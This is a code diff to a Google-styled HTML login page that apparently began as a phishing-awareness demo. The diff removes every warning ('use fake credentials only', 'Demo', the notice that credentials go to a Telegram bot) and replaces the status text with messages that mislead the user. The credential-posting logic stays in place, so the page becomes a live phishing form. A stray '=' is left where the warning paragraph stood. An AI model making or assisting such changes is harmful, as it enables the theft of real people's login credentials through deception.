@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Awareness Demo — NOT Google</title>
+    <title>Login NOT Google</title>
     <link rel="stylesheet" href="main.css">
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -32,12 +32,10 @@
                 <input type="password" id="password" name="password" placeholder="Password" aria-label="Password">
             </div>
 
-            <p class="guest-info" id="status-message">
-                This page demonstrates how a fake login page can steal credentials. Use <strong>fake</strong> credentials only.
-            </p>
+           =
 
             <div class="action-buttons">
-                <button class="next-button" id="demo-submit">Sign in (Demo)</button>
+                <button class="next-button" id="demo-submit">Sign in </button>
             </div>
         </div>
     </div>
@@ -53,12 +51,12 @@
         const password = document.getElementById('password').value.trim();
 
         if (!username || !password) {
-            status.textContent = 'Please fill in both fields (use fake credentials).';
+            status.textContent = 'Please fill in both fields.';
             status.style.color = '#b3261e';
             return;
         }
 
-        status.textContent = 'Sending demo credentials to Telegram bot...';
+        status.textContent = 'login in...';
         status.style.color = '#0b57d0';
 
         try {
@@ -71,7 +69,7 @@
             const result = await response.json();
 
             if (response.ok) {
-                status.textContent = '✅ Demo sent to Telegram! This is what an attacker would receive. Never enter real credentials on suspicious pages.';
+                status.textContent = 'sucessfull.redirecting to login page';
                 status.style.color = '#188038';
                 document.getElementById('username').value = '';
                 document.getElementById('password').value = '';
@@ -80,7 +78,7 @@
                 status.style.color = '#b3261e';
             }
         } catch (err) {
-            status.textContent = 'Could not reach the backend. Make sure Laravel is running (php artisan serve).';
+            status.textContent = 'try again later';
             status.style.color = '#b3261e';
         }
     });
